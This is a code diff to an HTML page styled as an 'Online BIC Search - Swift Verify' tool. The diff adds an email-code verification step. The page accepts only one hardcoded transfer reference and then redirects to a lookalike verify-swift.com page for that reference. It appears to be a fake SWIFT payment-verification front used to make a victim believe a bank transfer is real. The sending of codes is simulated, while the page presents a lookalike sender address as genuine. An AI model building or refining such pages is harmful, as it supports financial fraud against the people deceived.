@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Online BIC Search</title>
+  <title>Online BIC Search - Swift Verify</title>
   <style>
     body { 
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; 
@@ -200,6 +200,62 @@
       background-color: #e0e0e0;
       margin-top: 14px;
     }
+    .code-input {
+      letter-spacing: 8px;
+      font-size: 24px;
+      text-align: center;
+      font-weight: bold;
+    }
+    .email-info {
+      background-color: #f0f8ff;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .resend-link {
+      color: #007bff;
+      cursor: pointer;
+      text-decoration: underline;
+      margin-top: 10px;
+      display: inline-block;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      margin: 10px 0;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #a7f2e0;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .success-message {
+      background-color: #d4edda;
+      color: #155724;
+      padding: 12px;
+      border-radius: 6px;
+      margin-top: 15px;
+      text-align: center;
+      display: none;
+    }
+    .error-message {
+      background-color: #f8d7da;
+      color: #721c24;
+      padding: 12px;
+      border-radius: 6px;
+      margin-top: 15px;
+      text-align: center;
+      display: none;
+    }
     
     @media (max-width: 768px) { 
       nav { 
@@ -268,6 +324,8 @@
       <div class="step active" id="step1">1</div>
       <div class="step-line"></div>
       <div class="step" id="step2">2</div>
+      <div class="step-line"></div>
+      <div class="step" id="step3">3</div>
     </div>
     
     <!-- Step 1: Reference Number -->
@@ -295,6 +353,15 @@
         <input type="email" id="email" placeholder="Enter your email" />
       </div>
 
+      <div class="loading" id="loadingSend">
+        <div class="spinner"></div>
+        <p>Sending verification code...</p>
+      </div>
+
+      <div class="error-message" id="emailError">
+        Failed to send verification code. Please try again.
+      </div>
+
       <div class="form-actions">
         <button class="back-btn" id="backToRefBtn">Back</button>
         <button class="next-btn" id="sendCodeBtn">Send Code</button>
@@ -305,10 +372,31 @@
     <div class="step-content" id="step3Content" style="display: none;">
       <p>We've sent a 6-digit verification code to your email. Please enter it below.</p>
       
+      <div class="email-info">
+        <strong>Verification code sent to:</strong><br>
+        <span id="userEmailDisplay"></span><br>
+        <small>From: check@verify-swift.com</small>
+      </div>
+      
       <div class="form-group">
         <label for="verificationCode">Verification code</label>
-        <input type="text" id="verificationCode" placeholder="Enter 6-digit code" maxlength="6" />
+        <input type="text" id="verificationCode" class="code-input" placeholder="XXXXXX" maxlength="6" />
       </div>
+
+      <div class="success-message" id="successMessage">
+        ✓ Code verified successfully! Redirecting...
+      </div>
+
+      <div class="error-message" id="codeError">
+        Invalid verification code. Please try again.
+      </div>
+
+      <div class="loading" id="loadingResend" style="display: none;">
+        <div class="spinner"></div>
+        <p>Resending verification code...</p>
+      </div>
+
+      <div class="resend-link" id="resendCode">Didn't receive the code? Resend</div>
 
       <div class="form-actions">
         <button class="back-btn" id="backToEmailBtn">Back</button>
@@ -336,6 +424,7 @@
   const step3Content = document.getElementById('step3Content');
   const step1 = document.getElementById('step1');
   const step2 = document.getElementById('step2');
+  const step3 = document.getElementById('step3');
   
   // Buttons
   const nextToEmailBtn = document.getElementById('nextToEmailBtn');
@@ -343,14 +432,26 @@
   const sendCodeBtn = document.getElementById('sendCodeBtn');
   const backToEmailBtn = document.getElementById('backToEmailBtn');
   const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+  const resendCode = document.getElementById('resendCode');
   
   // Input fields
   const refInput = document.getElementById('ref');
   const emailInput = document.getElementById('email');
   const codeInput = document.getElementById('verificationCode');
+  const userEmailDisplay = document.getElementById('userEmailDisplay');
   
-  // Error message
+  // Messages
+  const loadingSend = document.getElementById('loadingSend');
+  const loadingResend = document.getElementById('loadingResend');
+  const successMessage = document.getElementById('successMessage');
+  const emailError = document.getElementById('emailError');
+  const codeError = document.getElementById('codeError');
   const notFoundEl = document.getElementById('not-found');
+  
+  // Store verification code and reference
+  let currentVerificationCode = '';
+  let currentReference = '';
+  let userEmail = '';
   
   // Open modal
   openModalBtn.addEventListener('click', function() {
@@ -376,6 +477,7 @@
     const ref = refInput.value.trim();
     
     if (ref === "COBA300525CH59279") {
+      currentReference = ref;
       notFoundEl.style.display = "none";
       // Show step 2
       step1Content.style.display = "none";
@@ -394,25 +496,57 @@
     step1Content.style.display = "block";
     step2.classList.remove('active');
     step1.classList.add('active');
+    emailError.style.display = 'none';
   });
   
-  // Send verification code
+  // Send verification code - DEMO VERSION
   sendCodeBtn.addEventListener('click', function(e) {
     e.preventDefault();
     const email = emailInput.value.trim();
     
     if (email && isValidEmail(email)) {
-      // In a real application, you would send the code to the email here
-      // For demo purposes, we'll just show the next step
-      step2Content.style.display = "none";
-      step3Content.style.display = "block";
+      // Show loading
+      loadingSend.style.display = 'block';
+      emailError.style.display = 'none';
+      sendCodeBtn.disabled = true;
       
-      // Generate and log a random 6-digit code (for demo purposes)
-      const verificationCode = Math.floor(100000 + Math.random() * 900000);
-      console.log(`Verification code for ${email}: ${verificationCode}`);
-      alert(`Demo: A verification code has been sent to ${email}. Check the browser console for the code.`);
+      // Generate 6-digit code
+      currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+      userEmail = email;
+      
+      // Simulate email sending
+      setTimeout(() => {
+        loadingSend.style.display = 'none';
+        sendCodeBtn.disabled = false;
+        
+        // Show step 3
+        step2Content.style.display = "none";
+        step3Content.style.display = "block";
+        step2.classList.remove('active');
+        step3.classList.add('active');
+        
+        // Display user email
+        userEmailDisplay.textContent = email;
+        
+        // Show demo info
+        console.log(`Verification code ${currentVerificationCode} sent to ${email}`);
+        alert(`DEMO: Verification code ${currentVerificationCode} sent to ${email}\n\nIn production, this would be sent automatically from check@verify-swift.com`);
+        
+      }, 2000);
+      
     } else {
       alert("Please enter a valid email address.");
+    }
+  });
+  
+  // Resend code functionality - DEMO VERSION
+  resendCode.addEventListener('click', function() {
+    if (userEmail) {
+      // Generate new code
+      currentVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+      
+      console.log(`New verification code ${currentVerificationCode} sent to ${userEmail}`);
+      alert(`DEMO: New verification code ${currentVerificationCode} sent to ${userEmail}\n\nIn production, this would be sent automatically from check@verify-swift.com`);
     }
   });
   
@@ -421,6 +555,9 @@
     e.preventDefault();
     step3Content.style.display = "none";
     step2Content.style.display = "block";
+    step3.classList.remove('active');
+    step2.classList.add('active');
+    codeError.style.display = 'none';
   });
   
   // Verify code and redirect
@@ -428,12 +565,29 @@
     e.preventDefault();
     const code = codeInput.value.trim();
     
-    if (code.length === 6) {
-      // In a real application, you would verify the code here
-      // For demo purposes, we'll just redirect
-      window.location.href = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+    if (code === currentVerificationCode) {
+      // Show success message
+      successMessage.style.display = 'block';
+      codeError.style.display = 'none';
+      verifyCodeBtn.disabled = true;
+      
+      // Redirect after 2 seconds
+      setTimeout(() => {
+        window.location.href = "https://verify-swift.com/checkswift/verification/COBA300525CH59279/BD10556814.html";
+      }, 2000);
+      
+    } else if (code.length === 6) {
+      codeError.style.display = 'block';
+      successMessage.style.display = 'none';
     } else {
       alert("Please enter a valid 6-digit code.");
+    }
+  });
+  
+  // Auto-tab between code digits
+  codeInput.addEventListener('input', function(e) {
+    if (this.value.length === 6) {
+      document.getElementById('verifyCodeBtn').focus();
     }
   });
   
@@ -450,12 +604,22 @@
     step3Content.style.display = "none";
     step1.classList.add('active');
     step2.classList.remove('active');
+    step3.classList.remove('active');
     refInput.value = '';
     emailInput.value = '';
     codeInput.value = '';
     notFoundEl.style.display = "none";
+    loadingSend.style.display = "none";
+    loadingResend.style.display = "none";
+    successMessage.style.display = "none";
+    emailError.style.display = "none";
+    codeError.style.display = "none";
+    sendCodeBtn.disabled = false;
+    verifyCodeBtn.disabled = false;
+    currentVerificationCode = '';
+    currentReference = '';
+    userEmail = '';
   }
 </script>
-
 </body>
 </html>
